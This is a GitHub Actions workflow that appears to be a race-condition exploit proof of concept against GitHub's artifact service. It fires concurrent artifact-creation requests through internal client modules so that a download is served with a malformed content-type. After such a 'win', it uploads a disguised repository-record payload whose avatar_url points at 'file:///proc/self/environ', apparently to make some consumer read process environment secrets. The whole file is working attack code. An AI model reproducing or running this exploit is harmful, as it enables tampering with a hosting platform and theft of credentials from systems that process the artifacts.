name: rc-mixrace
on:
  workflow_dispatch:
permissions:
  actions: write
  contents: read
jobs:
  mix:
    runs-on: ubuntu-latest
    steps:
      - name: deps
        run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
      - name: concurrent same-name create (v6 odd-mime vs v7 json)
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            const {createHash} = await import('node:crypto');
            const https = (await import('node:https')).default;
            const WS = process.env.GITHUB_WORKSPACE || process.cwd();
            const {internalArtifactTwirpClient} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js`);
            const {getBackendIdsFromToken} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/util.js`);
            const {StringValue} = await import(`${WS}/node_modules/@actions/artifact/lib/generated/index.js`);
            const ids = getBackendIdsFromToken();
            const mk = () => internalArtifactTwirpClient({maxAttempts: 1});
            const repo = process.env.GITHUB_REPOSITORY, stamp = process.env.GITHUB_RUN_ID;
            const sha = b => createHash('sha256').update(b).digest('hex');
            const ODD = 'application/json\u0085';
            const PH = Buffer.from('{}');
            const req = (url, method='GET', body=null, headers={}) => new Promise((res, rej) => {
              const u = new URL(url);
              const r = https.request(u, {method, headers, timeout: 30000}, resp => {
                const c=[]; resp.on('data',d=>c.push(d));
                resp.on('end',()=>res({status:resp.statusCode, headers:resp.headers, raw:resp.rawHeaders, body:Buffer.concat(c)}));
              });
              r.on('error',rej); r.on('timeout',()=>r.destroy(new Error('timeout')));
              if (body) r.write(body); r.end();
            });
            const ctHex = r => { const o=[]; for(let i=0;i<r.raw.length;i+=2) if(r.raw[i].toLowerCase()==='content-type') o.push(Buffer.from(r.raw[i+1],'latin1').toString('hex')); return o; };
            const sleep = ms => new Promise(r=>setTimeout(r,ms));

            async function create(name, version, mime) {
              try {
                const cr={workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,version};
                if (mime!==undefined) cr.mimeType=StringValue.create({value:mime});
                const v = await mk().CreateArtifact(cr);
                return {ok:!!v.ok, url:v.signedUploadUrl};
              } catch(e){ return {ok:false, err:String(e.message||e).slice(0,90)}; }
            }
            async function up(url, bytes) { if(!url) return null; try { await req(url,'PUT',bytes,{'x-ms-blob-type':'BlockBlob','Content-Length':String(bytes.length)}); return 200; } catch { return null; } }
            async function fin(name) { try { const v = await mk().FinalizeArtifact({...ids,name,size:String(PH.length),hash:StringValue.create({value:`sha256:${sha(PH)}`})}); return {ok:!!v.ok,id:String(v.artifactId||'')}; } catch(e){ return {ok:false, err:String(e.message||e).slice(0,90)}; } }
            async function view(id) {
              if(!id) return null;
              const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`,Accept:'application/vnd.github.v3+json','User-Agent':'rc'});
              if (api.status!==302||!api.headers.location) return {status:api.status};
              const loc=api.headers.location; const m=/[?&]rsct=([^&]*)/.exec(loc);
              let served=null;
              try { const fr = await req(new URL(loc).href); served = ctHex(fr); } catch(e){ served = ['FETCHERR:'+(e.code||'').slice(0,20)]; }
              return {rsctRaw:m?m[1]:null, servedCtHex:served};
            }

            const win = (v) => Array.isArray(v.servedCtHex) && v.servedCtHex.some(h => h.endsWith('85'));

            async function trial(i, order, delay) {
              const name = `mix-${stamp}-${order}-${delay}-${i}`;
              const out = {i, order, delay};
              let a, b;
              const first = order === 'v6first' ? [6, ODD] : [7, 'application/json'];
              const second = order === 'v6first' ? [7, 'application/json'] : [6, ODD];
              // fire both on independent clients, nearly simultaneously
              const pa = create(name, first[0], first[1]);
              if (delay > 0) await sleep(delay);
              const pb = create(name, second[0], second[1]);
              [a, b] = await Promise.all([pa, pb]);
              out.a = a.ok ? 'ok' : a.err; out.b = b.ok ? 'ok' : b.err;
              const results = [];
              for (const [tag, c] of [['a',a],['b',b]]) {
                if (!c.ok) continue;
                await up(c.url, PH);
                const f = await fin(name);
                if (!f.ok) { results.push({tag, fin: f.err}); continue; }
                const v = await view(f.id);
                results.push({tag, id: f.id, ...v});
                if (v && win(v)) {
                  // real carrier body now (full_name must equal the repository string)
                  const repository = `${repo}/actions/artifacts/${f.id}/zip`;
                  const body = Buffer.from(JSON.stringify({full_name: repository, owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}, description:'repo cassette', stargazers_count:0}));
                  await up(c.url, body);
                  const v2 = await view(f.id);
                  console.log('WINNER ' + JSON.stringify({name, tag, id: f.id, repository, payloadSha: sha(body), ...v2}));
                }
              }
              out.results = results;
              console.log('MIX ' + JSON.stringify(out));
            }

            const MIN = Number(process.env.MIX_MIN || 0), MAX = Number(process.env.MIX_MAX || 20);
            let n = 0;
            for (const order of ['v6first','v7first']) {
              for (const delay of [0,1,2,4,7,11,16,22,30]) {
                await Promise.all([0,1].map(k => trial(n++, order, delay).catch(e => console.log('MIXERR '+String(e).slice(0,100)))));
              }
            }
            console.log('MIX DONE ' + n);
